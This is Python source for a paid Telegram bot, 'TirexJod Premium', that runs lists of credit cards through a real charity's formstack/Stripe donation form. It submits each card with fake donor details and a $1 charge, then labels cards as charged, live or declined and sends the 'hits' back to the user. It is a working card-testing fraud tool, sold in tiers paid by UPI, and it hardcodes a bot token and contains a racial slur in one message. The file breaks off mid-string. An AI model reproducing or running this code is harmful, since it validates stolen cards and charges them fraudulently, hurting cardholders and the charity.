import os
import json
import time
import requests
import logging
import threading
import random
import string
import csv
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, HTTPServer

import telebot
from telebot import types
import user_agent

BOT_TOKEN   = "9135601732:AAFPZcKE7EIIB9ySbiATAtMEl21klsuiETY"
OWNER_ID    = 7799774057
CHANNEL_ID  = "@TirexFre"
CHANNEL_URL = "https://t.me/TirexFre"
UPI_ID      = "kartikshu@fam"
DB_FILE     = "db.json"
CONCURRENCY = 10
FREE_LIMIT  = 50

STICKER_WELCOME = ""
STICKER_SUCCESS = ""
STICKER_PAYMENT = ""

PLANS = {
    "pro":   {"name": "👑 PRO",   "limit": 1000,  "price": 149},
    "ultra": {"name": "⚡ ULTRA", "limit": 5000,  "price": 299},
    "max":   {"name": "💎 MAX",   "limit": 15000, "price": 499}
}

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
logging.basicConfig(level=logging.INFO)

class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Premium Bot is Alive!")

def run_dummy_server():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(('0.0.0.0', port), DummyHandler).serve_forever()

threading.Thread(target=run_dummy_server, daemon=True).start()

DEFAULT_DB = {"banned_users": [], "maintenance": False, "owner": OWNER_ID, "users": {}, "pending_payments": {}, "redeem_codes": {}, "stats": {"checked": 0, "hits": 0}}

def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, "w") as f: json.dump(DEFAULT_DB, f)
        return json.loads(json.dumps(DEFAULT_DB))
    with open(DB_FILE) as f: db = json.load(f)
    for k, v in DEFAULT_DB.items(): db.setdefault(k, v)
    return db

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f)

db = load_db()
user_state = {}

def set_state(uid, st): user_state[uid] = st
def get_state(uid): return user_state.get(uid, "menu")

def get_user(uid):
    uid = str(uid)
    if uid not in db["users"]: db["users"][uid] = {"sub": "none", "exp": 0, "used": 0, "username": "", "bonus_cards": 0}
    return db["users"][uid]

def check_sub_expiry(uid):
    u = get_user(uid)
    if u["sub"] != "none" and u["exp"] > 0 and time.time() > u["exp"]:
        u.update({"sub": "none", "exp": 0})
        save_db(db)

def get_remaining(uid):
    if is_owner(uid): return 999999999
    u = get_user(uid)
    if u["sub"] == "none": return max(0, FREE_LIMIT + u.get("bonus_cards", 0) - u["used"])
    plan = PLANS.get(u["sub"])
    if not plan: return max(0, FREE_LIMIT + u.get("bonus_cards", 0) - u["used"])
    return max(0, (plan["limit"] - u["used"]) + u.get("bonus_cards", 0))

def get_used(uid): return get_user(uid)["used"]
def is_owner(uid): return uid == db.get("owner", OWNER_ID)

def is_banned(uid):
    u = get_user(uid)
    uname = u.get("username", "").replace("@","").lower()
    return str(uid) in db["banned_users"] or (uname and uname in db["banned_users"])

def is_member(uid):
    if is_owner(uid): return True
    try: return bot.get_chat_member(CHANNEL_ID, uid).status in ("member", "administrator", "creator")
    except: return False

def send_sticker_or_text(chat_id, sticker_id, fallback_text, markup=None):
    if sticker_id:
        bot.send_sticker(chat_id, sticker_id)
        if fallback_text: bot.send_message(chat_id, fallback_text, reply_markup=markup)
    else:
        bot.send_message(chat_id, fallback_text, reply_markup=markup)

def kb_join():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📢 Join Official Channel", url=CHANNEL_URL))
    kb.add(types.InlineKeyboardButton("✅ Verified Member", callback_data="check_join"))
    return kb

def kb_menu(uid):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("💳 Check Cards", "📂 Upload File")
    kb.row("💎 Premium Plans", "🔑 Redeem Code")
    kb.row("📊 Dashboard")
    if is_owner(uid): kb.row("👑 Admin Control")
    return kb

def kb_cancel():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("❌ Cancel")
    return kb

def kb_admin():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🚫 Ban User", callback_data="adm_ban"))
    kb.add(types.InlineKeyboardButton("✅ Unban User", callback_data="adm_unban"))
    kb.add(types.InlineKeyboardButton("🛑 Cancel Sub", callback_data="adm_ban_sub"))
    kb.add(types.InlineKeyboardButton("🎟 Gen Redeem", callback_data="adm_gen_redeem"))
    kb.add(types.InlineKeyboardButton("🔧 Maint OFF" if not db["maintenance"] else "🔧 Maint ON", callback_data="adm_maint"))
    kb.add(types.InlineKeyboardButton("📈 Bot Stats", callback_data="adm_stats"))
    kb.add(types.InlineKeyboardButton("👥 Users List", callback_data="adm_users"))
    return kb

def kb_maintenance():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="check_maint"))
    return kb

def kb_plans():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("👑 PRO (1000) - ₹149", callback_data="buy_pro"))
    kb.add(types.InlineKeyboardButton("⚡ ULTRA (5000) - ₹299", callback_data="buy_ultra"))
    kb.add(types.InlineKeyboardButton("💎 MAX (15000) - ₹499", callback_data="buy_max"))
    return kb

def gate(message):
    uid = message.from_user.id
    if db["maintenance"] and not is_owner(uid):
        return bot.reply_to(message, "🛠 <b>Bot is currently under maintenance.</b>", reply_markup=kb_maintenance())
    if is_banned(uid): return bot.reply_to(message, "🚫 <b>Access Denied.</b>")
    if not is_member(uid):
        return bot.reply_to(message, "📢 <b>Channel Verification Required!</b>", reply_markup=kb_join())
    return True

def get_bin_info(binn):
    try:
        r = requests.get('https://binchk-api.vercel.app/bin=' + binn, timeout=5).json()
        return r.get('brand', 'N/A'), r.get('type', 'N/A'), r.get('bank', 'N/A'), r.get('country', 'N/A'), r.get('flag', '🏳️')
    except: return 'N/A', 'N/A', 'N/A', 'N/A', '🏳️'

def check_stripe(crd):
    crd = crd.strip()
    try: cn, mm, yy, cvv = crd.split('|')
    except: return (crd, "error", "Invalid Format", "N/A", "N/A", "N/A", "N/A", "N/A", "🏳️")
    user = user_agent.generate_user_agent()
    headers = {'Accept': 'application/json', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV', 'Origin': 'https://formstack.io', 'Referer': 'https://formstack.io/', 'User-Agent': user}
    files = [('inputdate', (None, '11/3/2024 4:21:19')), ('userTimeZone', (None, '300')), ('txtHtmlId', (None, '2hbx1Fv8p-niFCJlWMSc5A')), ('txtOrgId', (None, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')), ('txtRefreshToken', (None, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')), ('txtSessionID', (None, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')), ('submitMessage', (None, 'Thank you!')), ('paymentType', (None, 'Stripe')), ('formName', (None, 'Donation Management Form')), ('hfFileServiceApiKey', (None, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')), ('FSGFRadioButton356', (None, 'Company%20Donation')), ('Contact.FirstName', (None, 'williams')), ('Contact.LastName', (None, 'hiro')), ('Contact.Email', (None, 'aa0799414021%40gmail.com')), ('Contact.HomePhone', (None, '5124578451')), ('FSGFRadioButton346', (None, 'One-Time%20Donation')), ('FSGFDropdown701', (None, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')), ('Contact.Opportunity.A.Amount', (None, '1')), ('Contact.Opportunity.A.Funding_Program__c', (None, 'a0u8V00000AT2h7QAD')), ('Contact.Opportunity.A.CloseDate', (None, '11%2F03%2F2024')), ('Contact.Opportunity.A.Name', (None, 'New%20yorm')), ('Contact.Opportunity.A.RecordTypeId', (None, '0128V000001iNcAQAU')), ('Contact.Opportunity.A.CampaignId', (None, '7018V000000sLgrQAE')), ('Contact.Opportunity.A.Method_of_Payment__c', (None, 'Credit%20Card')), ('Contact.Opportunity.A.StageName', (None, 'Closed%20Won')), ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (None, 'Company%20Donation')), ('FFCreditCard14', (None, cn)), ('FFCVV14', (None, cvv)), ('FFExpiryMM14', (None, mm)), ('FFExpiryYYYY14', (None, yy)), ('Contact.AccountId.Name', (None, 'hiro')), ('Contact.AccountId.RecordTypeId', (None, '0128V000001iNc8QAE')), ('FSGFShortAnswer240', (None, '11%2F03%2F2024')), ('FSGFShortAnswer446', (None, 'williams')), ('FSGFShortAnswer929', (None, 'williams')), ('ReturnUrl', (None, 'https://formstack.io/D5036')), ('submitted', (None, '1'))]
    try:
        txt = requests.post('https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment', headers=headers, files=files, timeout=20).text
        binn = cn[:6]
        brand, ctype, bank, cnt, emj = get_bin_info(binn)
        if any(k in txt for k in ['declined', 'incorrect', 'Sorry, we do not accept', 'expiration']): status, msg = "declined", "Declined ❌"
        elif 'security code is incorrect' in txt: status, msg = "ccn", "CCN ✅"
        elif 'Your card could not be' in txt: status, msg = "live", "Live ✅"
        else: status, msg = "charge", "Charged ✅"
        return (crd, status, msg, binn, brand, ctype, bank, cnt, emj)
    except: return (crd, "error", "Error", "N/A", "N/A", "N/A", "N/A", "N/A", "🏳️")

def parse_creds(raw):
    return [l.strip() for l in raw.splitlines() if l.strip() and len(l.split('|')) == 4]

def run_check(message, creds):
    uid = message.from_user.id
    check_sub_expiry(uid)
    u = get_user(uid)
    is_own = is_owner(uid)
    rem = get_remaining(uid)
    if rem <= 0:
        set_state(uid, "menu")
        return bot.reply_to(message, "⚠️ <b>Limit Exhausted!</b>", reply_markup=kb_menu(uid))
    total = len(creds)
    if not is_own and total > rem:
        total = rem
        creds = creds[:total]
        bot.send_message(message.chat.id, "⚠️ <b>Notice:</b> Checking only " + str(total) + " cards due to your limit.")
    status_msg = bot.reply_to(message, "⚡ <b>Engine Started...</b>\n\n📊 Progress: <code>0 / " + str(total) + "</code>\n✅ Hits: <code>0</code>\n❌ Declined: <code>0</code>")
    hits, declined, errors, done, last_edit = [], 0, 0, 0, 0
    lock = threading.Lock()
    def _edit():
        try: bot.edit_message_text("⚡ <b>Checking Cards...</b>\n\n📊 Progress: <code>" + str(done) + " / " + str(total) + "</code>\n✅ Hits: <code>" + str(len(hits)) + "</code>\n❌ Declined: <code>" + str(declined) + "</code>", chat_id=status_msg.chat.id, message_id=status_msg.message_id)
        except: pass
    def worker(c):
        nonlocal declined, errors, done, last_edit
        res = check_stripe(c)
        with lock:
            if res[1] in ("ccn", "live", "charge"): hits.append(res)
            elif res[1] == "declined": declined += 1
            else: errors += 1
            done += 1
            if time.time() - last_edit > 2.5 or done == total:
                last_edit = time.time()
                _edit()
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        for _ in as_completed([ex.submit(worker, c) for c in creds]): pass
    if not is_own: u["used"] += total
    db["stats"]["checked"] += total
    db["stats"]["hits"] += len(hits)
    save_db(db)
    lines = []
    if hits:
        lines.append("💎 <b>CHARGED CARDS FOUND</b> 💎\n━━━━━━━━━━━━━━━━━━━━")
        for h in hits:
            lines.append("💳 <code>" + h[0] + "</code>\n↯ <b>Status:</b> " + h[2] + "\n↯ <b>BIN:</b> " + h[3] + " - " + h[4] + "\n↯ <b>Bank:</b> " + h[6] + "\n↯ <b>Charged:</b> $1\n━━━━━━━━━━━━━━━━━━━━")
    rem_str = "Unlimited (Owner)" if is_own else str(get_remaining(uid))
    lines.append("📊 <b>EXECUTION SUMMARY</b>\n\n🔍 Total Checked: <code>" + str(total) + "</code>\n❌ Declined: <code>" + str(declined) + "</code>\n✅ Successful: <code>" + str(len(hits)) + "</code>\n\n💳 <b>Cards Checked:</b> <code>" + str(get_used(uid)) + "</code>\n🔋 <b>Remaining Limit:</b> <code>" + rem_str + "</code>")
    res_txt = "\n".join(lines)
    try: bot.edit_message_text(res_txt[:4000], chat_id=status_msg.chat.id, message_id=status_msg.message_id)
    except: bot.send_message(message.chat.id, res_txt[:4000])
    if hits:
        fname = "Charged_" + str(uid) + "_" + str(int(time.time())) + ".txt"
        with open(fname, "w") as f:
            for h in hits: f.write(h[0] + " -> " + h[2] + " | Charged: $1\n")
        with open(fname, "rb") as f: bot.send_document(message.chat.id, f, caption="💎 <b>" + str(len(hits)) + " Charged Cards Found!</b>")
        os.remove(fname)
        if STICKER_SUCCESS: bot.send_sticker(message.chat.id, STICKER_SUCCESS)
    if not is_own and get_remaining(uid) <= 0:
        bot.send_message(message.chat.id, "❌ <b>Limit Finished!</b>", reply_markup=kb_plans())

@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid = message.from_user.id
    get_user(uid)["username"] = message.from_user.username or ""
    save_db(db)
    if db["maintenance"] and not is_owner(uid): return bot.reply_to(message, "🛠 <b>Maintenance</b>", reply_markup=kb_maintenance())
    if is_banned(uid): return bot.reply_to(message, "🚫 <b>Access Denied.</b>")
    if not is_member(uid): return bot.reply_to(message, "📢 <b>Channel Verification Required!</b>", reply_markup=kb_join())
    set_state(uid, "menu")
    send_sticker_or_text(message.chat.id, STICKER_WELCOME, "👑 <b>Welcome to TirexJod Premium!</b>\n\nHigh-speed Stripe $1 Checker.\nSelect an option from below:", kb_menu(uid))

@bot.callback_query_handler(func=lambda c: c.data == "check_join")
def cb_check_join(cq):
    if is_member(cq.from_user.id):
        set_state(cq.from_user.id, "menu")
        try: bot.edit_message_text("✅ Verification Successful.", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
        except: pass
        bot.send_message(cq.from_user.id, "🏠 <b>Premium Menu Loaded.</b>", reply_markup=kb_menu(cq.from_user.id))
    else: bot.answer_callback_query(cq.id, "❌ You haven't joined yet.", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "💳 Check Cards")
def menu_check(message):
    if not gate(message): return
    if not is_owner(message.from_user.id) and get_remaining(message.from_user.id) <= 0:
        return bot.reply_to(message, "⚠️ <b>Limit Exhausted!</b>", reply_markup=kb_plans())
    set_state(message.from_user.id, "creds")
    bot.reply_to(message, "💳 <b>Send cards in format:</b>\n<code>CC|MM|YY|CVV</code>\n\nOne per line.", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: m.text == "📂 Upload File")
def menu_upload(message):
    if not gate(message): return
    if not is_owner(message.from_user.id) and get_remaining(message.from_user.id) <= 0:
        return bot.reply_to(message, "⚠️ <b>Limit Exhausted!</b>", reply_markup=kb_plans())
    set_state(message.from_user.id, "file")
    bot.reply_to(message, "📂 <b>Upload .txt file containing cards:</b>", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: m.text == "📊 Dashboard")
def menu_stats(message):
    if not gate(message): return
    uid = message.from_user.id
    u = get_user(uid)
    plan = PLANS.get(u["sub"], {"name": "Free Trial"})
    rem_str = "Unlimited (Owner)" if is_owner(uid) else str(get_remaining(uid))
    bot.reply_to(message, "👤 <b>User Dashboard</b>\n\n💎 <b>Plan:</b> " + plan['name'] + "\n✅ <b>Cards Checked:</b> <code>" + str(get_used(uid)) + "</code>\n🔋 <b>Cards Remaining:</b> <code>" + rem_str + "</code>", reply_markup=kb_menu(uid))

@bot.message_handler(func=lambda m: m.text == "❌ Cancel")
def menu_cancel(message):
    set_state(message.from_user.id, "menu")
    bot.reply_to(message, "❌ <b>Action Cancelled.</b>", reply_markup=kb_menu(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == "👑 Admin Control")
def menu_admin(message):
    if not is_owner(message.from_user.id): return
    bot.reply_to(message, "👑 <b>Admin Control Panel</b>\nManage your bot here:", reply_markup=kb_admin())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "creds" and m.text and m.text != "❌ Cancel")
def on_creds(message):
    creds = parse_creds(message.text)
    set_state(message.from_user.id, "menu")
    threading.Thread(target=run_check, args=(message, creds), daemon=True).start()

@bot.message_handler(content_types=["document"], func=lambda m: get_state(m.from_user.id) == "file")
def on_file(message):
    if not message.document.file_name.endswith(".txt"): return bot.reply_to(message, "❌ <b>Only .txt files are allowed.</b>")
    text = bot.download_file(bot.get_file(message.document.file_id).file_path).decode("utf-8", errors="ignore")
    creds = parse_creds(text)
    set_state(message.from_user.id, "menu")
    threading.Thread(target=run_check, args=(message, creds), daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "💎 Premium Plans")
def menu_plans(message):
    if not gate(message): return
    txt = "💎 <b>TirexJod Premium Plans (1 Week)</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for k, v in PLANS.items(): txt += "🔹 " + v['name'] + " : <code>" + str(v['limit']) + "</code> Cards - <b>₹" + str(v['price']) + "</b>\n"
    bot.reply_to(message, txt + "\n💳 <b>Payment UPI:</b> <code>" + UPI_ID + "</code>\n\nSelect a plan to buy:", reply_markup=kb_plans())

@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
def cb_buy_plan(cq):
    plan_key = cq.data.split("_")[1]
    bot.send_message(cq.from_user.id, "🛒 <b>Plan:</b> " + PLANS[plan_key]['name'] + "\nPay <b>₹" + str(PLANS[plan_key]['price']) + "</b> to UPI: <code>" + UPI_ID + "</code>\n\n✍️ <b>Enter 12-digit UTR ID:</b>", reply_markup=kb_cancel())
    user_state[cq.from_user.id] = {"state": "wait_utr", "plan": plan_key}

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "wait_utr" and m.text)
def on_utr(message):
    if message.text == "❌ Cancel": return menu_cancel(message)
    utr = message.text.strip()
    if not utr.isdigit() or len(utr) != 12: return bot.reply_to(message, "❌ <b>Invalid UTR.</b> Please send exactly 12 digits.")
    user_state[message.from_user.id]["utr"] = utr
    set_state(message.from_user.id, "wait_screenshot")
    bot.reply_to(message, "✅ <b>UTR Saved.</b>\nNow send the <b>Payment Screenshot</b>:", reply_markup=kb_cancel())

@bot.message_handler(content_types=["photo"], func=lambda m: get_state(m.from_user.id) == "wait_screenshot")
def on_screenshot(message):
    uid = message.from_user.id
    data = user_state.get(uid, {})
    if "plan" not in data: return bot.reply_to(message, "❌ Error.")
    db["pending_payments"][str(uid)] = {"plan": data["plan"], "utr": data["utr"]}
    save_db(db)
    send_sticker_or_text(uid, STICKER_PAYMENT, "✅ <b>Wait for Admin Approval</b>", kb_menu(uid))
    set_state(uid, "menu")
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("✅ Approve", callback_data="appr_" + str(uid)), types.InlineKeyboardButton("❌ Disprove", callback_data="rej_" + str(uid)))
    bot.send_photo(OWNER_ID, message.photo[-1].file_id, caption="💰 <b>New Payment Request</b>\n\n👤 User: @" + str(message.from_user.username or uid) + "\n💎 Plan: " + PLANS[data['plan']]['name'] + "\n🧾 UTR: <code>" + data['utr'] + "</code>", reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data.startswith("appr_") or c.data.startswith("rej_"))
def cb_approve_payment(cq):
    if not is_owner(cq.from_user.id): return
    action, uid_str = cq.data.split("_")
    if uid_str not in db["pending_payments"]: return bot.answer_callback_query(cq.id, "Already processed.")
    pd = db["pending_payments"].pop(uid_str)
    save_db(db)
    u = get_user(uid_str)
    if action == "appr":
        u.update({"sub": pd["plan"], "exp": time.time() + (7 * 24 * 60 * 60), "used": 0})
        save_db(db)
        bot.edit_message_caption("✅ Approved", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
        bot.send_message(uid_str, "🎉 <b>Payment Approved</b>\n\n💎 Subscription Activation: <b>" + PLANS[pd['plan']]['name'] + "</b>\n⏳ Valid: 7 Days\n\nEnjoy Premium Access!", reply_markup=kb_menu(uid_str))
    else:
        bot.edit_message_caption("❌ Disproved", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
        bot.send_message(uid_str, "❌ <b>Payment Fake Detection (Nigga)</b>\nYour payment proof is invalid.")

@bot.message_handler(func=lambda m: m.text == "🔑 Redeem Code")
def menu_redeem(message):
    if not gate(message): return
    set_state(message.from_user.id, "wait_redeem")
    bot.reply_to(message, "🔑 <b>Enter your Redeem Code:</b>", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "wait_redeem" and m.text)
def on_redeem(message):
    if message.text == "❌ Cancel": return menu_cancel(message)
    code, uid = message.text.strip().upper(), str(message.from_user.id)
    if code not in db["redeem_codes"]: return bot.reply_to(message, "❌ <b>Invalid Code.</b>")
    rc = db["redeem_codes"][code]
    if len(rc["used_by"]) >= rc["limit"] or uid in rc["used_by"]: return bot.reply_to(message, "❌ <b>Limit reached or Already used.</b>")
    u = get_user(uid)
    u["bonus_cards"] = u.get("bonus_cards", 0) + rc["cards"]
    rc["used_by"].append(uid)
    save_db(db)
    set_state(uid, "menu")
    bot.reply_to(message, "🎉 <b>Redeemed Successfully!</b>\n+" + str(rc['cards']) + " Cards added to your limit.", reply_markup=kb_menu(uid))

@bot.callback_query_handler(func=lambda c: c.data == "adm_ban")
def cb_ban(cq):
    if not is_owner(cq.from_user.id): return
    set_state(cq.from_user.id, "adm_ban_user")
    bot.send_message(cq.from_user.id, "🚫 <b>Enter username to ban (e.g. @user):</b>", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "adm_ban_user" and m.text and m.text != "❌ Cancel")
def on_adm_ban(message):
    uname = message.text.strip().lower().replace("@","")
    if uname not in db["banned_users"]: db["banned_users"].append(uname)
    save_db(db)
    set_state(message.from_user.id, "menu")
    bot.reply_to(message, "🚫 @" + uname + " has been banned.", reply_markup=kb_menu(message.from_user.id))

@bot.callback_query_handler(func=lambda c: c.data == "adm_unban")
def cb_unban(cq):
    if not is_owner(cq.from_user.id): return
    set_state(cq.from_user.id, "adm_unban_user")
    bot.send_message(cq.from_user.id, "✅ <b>Enter username to unban:</b>", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "adm_unban_user" and m.text and m.text != "❌ Cancel")
def on_adm_unban(message):
    uname = message.text.strip().lower().replace("@","")
    if uname in db["banned_users"]: db["banned_users"].remove(uname)
    save_db(db)
    set_state(message.from_user.id, "menu")
    bot.reply_to(message, "✅ @" + uname + " has been unbanned.", reply_markup=kb_menu(message.from_user.id))

@bot.callback_query_handler(func=lambda c: c.data == "adm_ban_sub")
def cb_ban_sub(cq):
    if not is_owner(cq.from_user.id): return
    subs = [u for u, d in db["users"].items() if d.get("sub") != "none"]
    if not subs: return bot.answer_callback_query(cq.id, "No active subs.")
    kb = types.InlineKeyboardMarkup()
    for uid in subs:
        u = db["users"][uid]
        kb.add(types.InlineKeyboardButton("@" + u.get('username', uid) + " (" + u['sub'].upper() + ")", callback_data="cansub_" + str(uid)))
    bot.send_message(cq.from_user.id, "🛑 <b>Select Subscription to Cancel:</b>", reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data.startswith("cansub_"))
def cb_cancel_sub(cq):
    if not is_owner(cq.from_user.id): return
    uid = cq.data.split("_")[1]
    get_user(uid).update({"sub": "none", "exp": 0, "used": 0})
    save_db(db)
    bot.edit_message_text("🛑 Sub cancelled for " + uid + ".", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
    try: bot.send_message(uid, "🛑 Sub cancelled by Admin.")
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == "adm_gen_redeem")
def cb_gen_redeem(cq):
    if not is_owner(cq.from_user.id): return
    set_state(cq.from_user.id, "adm_gen_limit")
    bot.send_message(cq.from_user.id, "🎟 <b>Format:</b> `USES CARDS` (e.g. `5 1000`):", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "adm_gen_limit" and m.text)
def on_gen_redeem(message):
    if message.text == "❌ Cancel": return menu_cancel(message)
    try:
        uses, cards = map(int, message.text.split())
        code = "TJ-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db["redeem_codes"][code] = {"limit": uses, "cards": cards, "used_by": []}
        save_db(db)
        set_state(message.from_user.id, "menu")
        bot.reply_to(message, "✅ <b>Code Generated!</b>\n<code>"
